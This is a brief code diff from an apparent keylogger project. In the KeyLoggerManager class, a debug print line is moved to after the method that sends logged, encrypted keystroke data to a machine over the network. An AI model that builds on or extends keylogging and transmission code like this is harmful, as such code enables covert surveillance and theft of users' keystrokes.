@@ -46,6 +46,7 @@ class KeyLoggerManager:
 
     def send_logged_keys(self,log_time, encrypted_data):
         payload = {log_time: encrypted_data}
-        print(f"Sending data: {payload} to {self.key_logger.get_machine_name()}")
 
         self.network_writer.send_data(payload, self.key_logger.get_machine_name())
+        print(f"Sending data: {payload} to {self.key_logger.get_machine_name()}")
+
